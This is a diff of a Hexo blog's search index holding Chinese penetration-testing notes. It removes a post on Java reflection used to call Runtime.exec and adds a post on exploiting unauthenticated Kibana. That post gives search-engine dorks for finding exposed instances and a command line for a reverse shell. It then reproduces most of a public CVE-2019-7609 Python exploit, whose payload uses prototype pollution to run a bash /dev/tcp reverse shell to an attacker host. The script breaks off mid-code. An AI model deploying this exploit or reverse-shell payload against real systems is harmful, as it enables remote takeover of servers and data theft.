-<p>由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。</p>
-</li>
-</ul>
-<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>我们可以从上面的反射代码中观察到，第一句代码的操作是获取类Class对象，所以这里简单记录下获取Class对象发方法:</p>
-<ul>
-<li><p>类名.class.</p>
-<p>如:com.fanseTest.helloworld.class</p>
-</li>
-<li><p>Class.formName(“类名”).</p>
-<p>如:Class.forName(“com.fanseTest.helloworld”)</p>
-</li>
-<li><p>对象名.getClass().</p>
-<p>如:helloworld test &#x3D; new helloworld();        hello.getClass()</p>
-</li>
-<li><p>classloader.loadClass(“类名”)如:ClassLoader.getSystemClassLoader().loadClass(“com.fanseTest.helloworld”)</p>
-</li>
-</ul>
-<p>如下:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String str = <span class="string">&quot;com.fanseTest.helloworld&quot;</span>;</span><br><span class="line">        Class test =  helloworld.class;</span><br><span class="line">        Class test1 = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Class test2 = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        System.out.println(test.toString());</span><br><span class="line">        System.out.println(test1.toString());</span><br><span class="line">        System.out.println(test2.toString());</span><br><span class="line">        helloworld test3 = <span class="keyword">new</span> helloworld();</span><br><span class="line">        System.out.println(test3.getClass().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果:</p>
-<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211204195824874.png" class title="image-20211204195824874">
-
-
-
-<p>值的注意的是，当我们获取数组类型的Class对象时，使用java类型描述符(类型描述符相关介绍参见<a href="https://www.haoyun.fit/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/">JAVA类型描述符 | 小透的少年江湖 (haoyun.fit)</a>)</p>
-<p>举个栗子:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; booleanArray = Class.forname(&quot;[Z&quot;);//获取布尔数组类对象</span><br><span class="line">Class&lt;?&gt; doubleArray = Class.forname(&quot;[D&quot;);//获取浮点数组类对象</span><br><span class="line">Class&lt;?&gt; byteArray = Class.forname(&quot;[B&quot;);//获取字节数组类对象</span><br><span class="line">Class&lt;?&gt; classArray = Class.forname(&quot;[Lclassname;&quot;);</span><br><span class="line">Class&lt;?&gt; cstringArray = Class.forname(&quot;[Ljava.lang.String;&quot;);//获取字符串数组类对象</span><br><span class="line">//[符号根据数组维度来添加</span><br></pre></td></tr></table></figure>
-
-<p>注:</p>
-<p>反射 调用内部类的时候需要使用$来代替.，如com.reflect.ReflectTest类中有一个叫做Hello的内部类，调用时将类名写成:com.reflect.ReflectTest$Hello。</p>
-<h2 id="RunTime反射"><a href="#RunTime反射" class="headerlink" title="RunTime反射"></a>RunTime反射</h2><p>学习了什么是java反射机制和java反射机制的优缺点，我就有了一个疑问？对于渗透测试代码审计来说，java反射的作用是什么？或者说怎么利用这个机制进行测试。在一些反序列化漏洞执行系统命令时可以调用Runtime等类执行本地命令编写漏洞利用代码、代码审计、绕过RASP方法等，还有后面要学习的内存马等。</p>
-<h3 id="本地命令执行"><a href="#本地命令执行" class="headerlink" title="本地命令执行"></a>本地命令执行</h3><p>执行本地命令:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>反射Demo1:(注:记得添加org.apache.commons.io程序包)</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;    <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">            Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">            String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">            Object runtimeInstance = constructor.newInstance();</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">            Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">            Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果:</p>
-<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211207185314924.png" class title="image-20211207185314924">
-
-<p>返回当前用户为:”desktop-3n366og\administrator”。</p>
-<p>反射 Demo2:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">        Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">        Object runtime = runtimeClass1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runtimeClass1);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">        Process process = (Process) runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(runtime,cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">        InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">        System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这两个代码都是反射调用Runtime类的exec()方法执行本地命令执行。但两者不同的是，Demo1获取Runtime类对象是通过构造器创建构造方法来获取，而Demo2是通过Runtime类的getRuntime()方法来获取。</p>
-<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><p>反射调用Runtime实现本地命令执行的流程如下:</p>
-<ul>
-<li>反射获取<code>Runtime</code>类对象(如<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)</li>
-<li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)</li>
-<li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)</li>
-<li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)</li>
-</ul>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-        <category>java</category>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>-Java基础 -java反射 -代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -2037,7 +2037,7 @@
 <img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230416357.png" class title="image-20210805230416357">
 
 <p>查询机器被哪些用户登录过</p>
-<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">
+<img src="/Windows信息收集list.assets/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">
 
 <h2 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h2><h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><table>
 <thead>
@@ -2145,7 +2145,7 @@
 
 <p>别看到普通权限就提权，实在没法深入再提权。</p>
 <p>提权可能打崩服务器，或者不免杀触发警报。</p>
-<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">
+<img src="/Windows信息收集list.assets/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">
 
 <h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>主要关注修补程序</p>
 <h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>
@@ -2209,6 +2209,30 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2021/09/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>-博客测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git用法小记</title>
     <url>/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
@@ -2268,27 +2292,60 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/09/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>kibana未授权访问利用</title>
+    <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Kibana &lt; 5.6.15</p>
+<p>Kibana &lt; 6.6.1</p>
+<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>Fofa:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问kibana系统</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/app/kibana</span><br></pre></td></tr></table></figure>
+
+
+
+<p>无需账号密码就可以登录进入图形化界面</p>
+<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125150723328.png" class title="image-20211125150723328">
+
+
+
+<p>下面利用脚本进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-7609-kibana-rce.py -u 目标主机ip地址:5601 -host 攻击主机ip地址 -port 监听端口 –-shell</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162717040.png" class title="image-20211125162717040">
+
+
+
+<p>反弹shell成功</p>
+<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162801162.png" class title="image-20211125162801162">
+
+
+
+<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>poc地址 :</p>
+<p><a href="https://github.com/LandGrey/CVE-2019-7609">LandGrey&#x2F;CVE-2019-7609: exploit CVE-2019-7609(kibana RCE) on right way by python2 scripts (github.com)</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> distutils.version <span class="keyword">import</span> StrictVersion</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_kibana_version</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/app/kibana&quot;</span>)</span><br><span class="line">    r = requests.get(url, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">    patterns = [<span class="string">&#x27;&amp;quot;version&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, <span class="string">&#x27;&quot;version&quot;:&quot;(.*?)&quot;,&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        match = re.findall(pattern, r.content)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> match[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;9.9.9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version_compare</span>(<span class="params">standard_version, compare_version</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sc1 = StrictVersion(standard_version[<span class="number">0</span>])</span><br><span class="line">        sc2 = StrictVersion(standard_version[<span class="number">1</span>])</span><br><span class="line">        cc = StrictVersion(compare_version)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] ERROR : kibana version compare failed !&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc1 &gt; cc <span class="keyword">or</span> (StrictVersion(<span class="string">&quot;6.0.0&quot;</span>) &lt;= cc <span class="keyword">and</span> sc2 &gt; cc):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">global</span> version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> version <span class="keyword">or</span> <span class="keyword">not</span> version_compare([<span class="string">&quot;5.6.15&quot;</span>, <span class="string">&quot;6.6.1&quot;</span>], version):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;auto&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> r.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;&quot;seriesList&quot;&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">target, ip, port</span>):</span></span><br><span class="line">    random_name = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;qwertyuiopasdfghjkl&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*).props(label.__proto__.env.AAAA=&#x27;require(\&quot;child_process\&quot;).exec(\&quot;if [ ! -f /tmp/%s ];then touch /tmp/%s &amp;&amp; /bin/bash -c \\&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&#x27;; fi\&quot;);process.exit()//&#x27;)\n.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-15m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;10s&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> % (random_name, random_name, ip, port)</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r1 = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code == <span class="number">200</span>:</span><br><span class="line">        trigger_url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/socket.io/?EIO=3&amp;transport=polling&amp;t=MtjhZoM&quot;</span>)</span><br><span class="line">        new_headers = headers</span><br><span class="line">        new_headers.update(&#123;<span class="string">&#x27;kbn-xsrf&#x27;</span>: <span class="string">&#x27;professionally-crafted-string-of-text&#x27;</span>&#125;)</span><br><span class="line">        r2 = requests.get(trigger_url, verify=<span class="literal">False</span>, headers=new_headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, dest=<span class="string">&#x27;url&#x27;</span>, default=<span class="string">&quot;http://127.0.0.1:5601&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;such as: http://127.0.0.1:5601&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-host&quot;</span>, dest=<span class="string">&#x27;remote_host&#x27;</span>, default=<span class="string">&quot;127.0.0.1&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote host: such as: 1.1.1.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-port&quot;</span>, dest=<span class="string">&#x27;remote_port&#x27;</span>, default=<span class="string">&quot;8888&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote port: such as: 8888&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, dest=<span class="string">&#x27;reverse_shell&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell after verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">&#x27;-h&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.url</span><br><span class="line">    remote_host = 